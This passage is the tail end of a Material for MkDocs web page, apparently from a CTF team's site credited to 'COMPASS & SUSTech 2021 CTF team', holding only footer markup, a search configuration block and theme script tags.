            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      COMPASS & SUSTech 2021 CTF team
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.bd0b6b67.min.js"}</script>
    
    
      <script src="../../assets/javascripts/bundle.467223ff.min.js"></script>
      
    
  </body>
</html>